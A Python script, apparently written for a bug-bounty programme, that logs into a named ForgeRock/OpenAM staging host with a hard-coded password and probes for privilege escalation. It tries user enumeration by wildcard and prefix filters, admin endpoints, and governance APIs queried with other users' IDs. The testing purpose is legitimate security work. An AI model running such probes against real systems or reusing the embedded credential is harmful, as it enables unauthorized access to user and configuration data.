# -*- coding: utf-8 -*-
"""AIC 第二十轮:自助会话 + 授权面全面复查(最终矩阵)
能力:API 登录 → tokenId → cookie aa942d46ece12ce=tokenId(等价浏览器会话)
矩阵:
  1. 会话验证
  2. 用户查询边界:自己/他人/通配/contains
  3. 管理面:groups/applications/agents/policies/realms/realm-config/selfservice
  4. IGA 纯会话访问(不带 Bearer)
预期结果表:
  成立 -> 只能查自己;他人/管理面 403;IGA 需 token
  不成立(发现) -> 越权读取
"""
import requests, urllib3, json
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'research-1643',
                  'Accept-API-Version': 'resource=1.0, protocol=1.0',
                  'Content-Type': 'application/json'})

# 登录
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
print('LOGIN OK:', tok[:40])

# 会话:直接用 cookie 名
S2 = requests.Session()
S2.trust_env = False
S2.proxies = {'http': None, 'https': None}
S2.headers.update({'User-Agent': 'research-1643',
                   'Cookie': 'aa942d46ece12ce=' + tok + '; amlbcookie=01',
                   'Accept-API-Version': 'resource=2.1, protocol=1.0'})

def probe(method, path, body=None):
    kw = {}
    if body is not None:
        kw['json'] = body
    try:
        r = S2.request(method, BASE + path, timeout=12, verify=False, **kw)
        print('%-5s %-80s -> %d  %s' % (method, path[:80], r.status_code, r.text[:220].replace('\n', ' ')))
        return r
    except Exception as e:
        print('%-5s %-80s -> ERR %s' % (method, path[:80], str(e)[:60]))

print('\n=== 1. 会话验证 ===')
probe('POST', '/am/json/realms/root/realms/alpha/sessions?_action=getSessionInfo', {'withCredentials': True})
probe('POST', '/am/json/realms/root/realms/alpha/sessions?_action=validate')
probe('GET', '/am/json/realms/root/realms/alpha/users/self')
probe('POST', '/am/json/realms/root/realms/alpha/sessions?_action=idFromSession')

print('\n=== 2. 用户查询边界 ===')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=userName+eq+%22pccp%22')
probe('GET', '/am/json/realms/root/realms/alpha/users/' + MY_ID)
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=true')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=userName+eq+%22researcher1643%22')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=userName+eq+%22researcher1643b%22')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=mail+eq+%221643584176%40wearehackerone.com%22')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=userName+sw+%22pccp%22')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=userName+sw+%22admin%22')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=userName+co+%22pcc%22')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=userName+eq+%22*%22')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=mail+sw+%22%40qq.com%22')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=id+eq+%22' + MY_ID + '%22')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryId=all')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=userName+eq+%22pccp%22&_fields=userName,mail,givenName')

print('\n=== 3. 管理面复查 ===')
for p in ['/am/json/realms/root/realms/alpha/groups?_queryFilter=true',
          '/am/json/realms/root/realms/alpha/groups?_queryFilter=name+sw+%22a%22',
          '/am/json/realms/root/realms/alpha/applications?_queryFilter=true',
          '/am/json/realms/root/realms/alpha/agents?_queryFilter=true',
          '/am/json/realms/root/realms/alpha/policies?_queryFilter=true',
          '/am/json/realms/root/realms/alpha/realms',
          '/am/json/realms/root/realms/alpha/realm-config',
          '/am/json/realms/root/realms/alpha/selfservice/kba',
          '/am/json/realms/root/realms/alpha/selfservice/userRegistration',
          '/am/json/realms/root/realms/alpha/authentication/authenticators',
          '/am/json/realms/root/realms/alpha/authentication/authenticate',
          '/am/json/realms/root/realms/alpha/oauth2/clients?_queryFilter=true',
          '/am/json/realms/root/realms/alpha/scripts?_queryFilter=true',
          '/am/json/realms/root/realms/alpha/emailTemplates?_queryFilter=true']:
    probe('GET', p)

print('\n=== 4. IGA 纯会话访问(不带 Bearer) ===')
probe('GET', '/iga/governance/user/%s/grants?pageSize=10' % MY_ID)
probe('POST', '/iga/governance/user/%s/requests?_pageSize=0&_status=in-progress&_action=search' % MY_ID,
      {'targetFilter': {'operand': [{'operator': 'EQUALS', 'operand': {'targetName': 'decision.status', 'targetValue': 'in-progress'}}], 'operator': 'AND'}})
probe('GET', '/iga/governance/user/00000000-0000-0000-0000-000000000000/grants?pageSize=10')

print('\n=== 5. 会话注销检查(最后做) ===')
# 不做 logout,保持会话供后续使用
